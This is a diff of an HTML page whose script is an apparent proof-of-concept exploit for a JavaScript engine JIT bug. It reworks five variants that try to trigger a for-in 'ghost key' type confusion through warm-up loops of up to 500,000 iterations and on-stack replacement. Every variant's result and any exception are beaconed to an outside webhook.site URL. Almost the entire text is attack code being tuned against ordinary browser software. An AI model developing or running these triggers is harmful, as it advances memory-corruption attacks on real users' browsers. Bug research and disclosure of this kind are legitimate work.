@@ -3,20 +3,21 @@ const SINK = 'https://webhook.site/c7b10235-199e-45d3-89bd-2f53b4ecab6d/';
 function beacon(t, v){
   try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,200)), {mode:'no-cors'}); } catch(e) {}
 }
+beacon('start', 't3159-multi');
 
 function setup() {
-  const object1 = {a:1};
-  const object2 = {a:1, b:1};
-  const object3 = {a:1, b:1, c:1};
+  const object1 = {}; object1.a = 1;
+  const object2 = {}; object2.a = 1; object2.b = 1;
+  const object3 = {}; object3.a = 1; object3.b = 1; object3.c = 1;
   Object.defineProperty(object3, "d", {writable: false, enumerable: true, value: 1});
-  const object4 = {a:1, b:1, c:1, d:1};
+  const object4 = {}; object4.a = 1; object4.b = 1; object4.c = 1; object4.d = 1;
   for (let key in object3) { }
   delete object3.d;
   return {object1, object2, object3, object4};
 }
 
-// V1: Original PoC (natives-style warm)
-function v1() {
+// V1: Original (minimal warm) — baseline
+function v1_original() {
   const {object1, object2, object4} = setup();
   let escape;
   function trigger(cb) {
@@ -27,12 +28,12 @@ function v1() {
   }
   trigger(_ => _);
   trigger(_ => _);
-  trigger(function () { object4.c = 1.1; for (let k in object1) { } });
+  trigger(function () { object4.c = 1.1; for (let key in object1) { } });
   return typeof escape + ':' + escape;
 }
 
-// V2: High warm
-function v2() {
+// V2: High warm (100k) — force natural TF compilation
+function v2_highwarm() {
   const {object1, object2, object4} = setup();
   let escape;
   function trigger(cb) {
@@ -41,50 +42,37 @@ function v2() {
       escape = object2[key];
     }
   }
-  for (let i = 0; i < 200000; i++) trigger(_ => _);
-  trigger(function () { object4.c = 1.1; for (let k in object1) { } });
+  for (let i = 0; i < 100000; i++) trigger(_ => _);
+  trigger(function () { object4.c = 1.1; for (let key in object1) { } });
   return typeof escape + ':' + escape;
 }
 
-// V3: Count keys in for-in (direct ghost key detection)
-function v3() {
-  const {object2, object4} = setup();
-  object4.c = 1.1;
-  let count = 0;
-  for (let k in object2) { count++; }
-  return count + ' keys';
-}
-
-// V4: Original + count all keys
-function v4() {
+// V3: Very high warm (500k) — even more TF pressure
+function v3_vhighwarm() {
   const {object1, object2, object4} = setup();
   let escape;
-  let count = 0;
-  let keys = [];
   function trigger(cb) {
     for (let key in object2) {
       cb();
       escape = object2[key];
-      keys.push(key);
     }
   }
-  trigger(_ => _);
-  trigger(_ => _);
-  keys = [];
-  trigger(function () { object4.c = 1.1; for (let k in object1) { } });
-  return keys.join(',') + ' e=' + typeof escape + ':' + escape;
+  for (let i = 0; i < 500000; i++) trigger(_ => _);
+  trigger(function () { object4.c = 1.1; for (let key in object1) { } });
+  return typeof escape + ':' + escape;
 }
 
-// V5: For-in inside hot loop (OSR)
-function v5() {
+// V4: OSR — for-in inside hot loop
+function v4_osr() {
   const {object1, object2, object4} = setup();
   let escape;
-  let count = 0;
-  for (let i = 0; i < 50000; i++) {
+  let fired = false;
+  for (let k = 0; k < 200000; k++) {
     for (let key in object2) {
-      if (i === 49999) {
+      if (!fired && k === 199999) {
         object4.c = 1.1;
-        for (let k in object1) { }
+        for (let key2 in object1) { }
+        fired = true;
       }
       escape = object2[key];
     }
@@ -92,10 +80,30 @@ function v5() {
   return typeof escape + ':' + escape;
 }
 
-beacon('v1', v1());
-beacon('v2', v2());
-beacon('v3', v3());
-beacon('v4', v4());
-beacon('v5', v5());
-beacon('done', 'all');
+// V5: Count keys during fire to detect ghost keys
+function v5_countkeys() {
+  const {object1, object2, object4} = setup();
+  let escape;
+  let keysSeen = [];
+  function trigger(cb) {
+    for (let key in object2) {
+      keysSeen.push(key);
+      cb();
+      escape = object2[key];
+    }
+  }
+  trigger(_ => _);
+  trigger(_ => _);
+  keysSeen = [];
+  trigger(function () { object4.c = 1.1; for (let key in object1) { } });
+  return keysSeen.length + 'keys:' + keysSeen.join(',');
+}
+
+// Run all variants, beacon each
+try { beacon('v1', v1_original()); } catch(e) { beacon('v1-exc', String(e).slice(0,100)); }
+try { beacon('v2', v2_highwarm()); } catch(e) { beacon('v2-exc', String(e).slice(0,100)); }
+try { beacon('v3', v3_vhighwarm()); } catch(e) { beacon('v3-exc', String(e).slice(0,100)); }
+try { beacon('v4', v4_osr()); } catch(e) { beacon('v4-exc', String(e).slice(0,100)); }
+try { beacon('v5', v5_countkeys()); } catch(e) { beacon('v5-exc', String(e).slice(0,100)); }
+beacon('done', 'all-variants');
 </script></body></html>
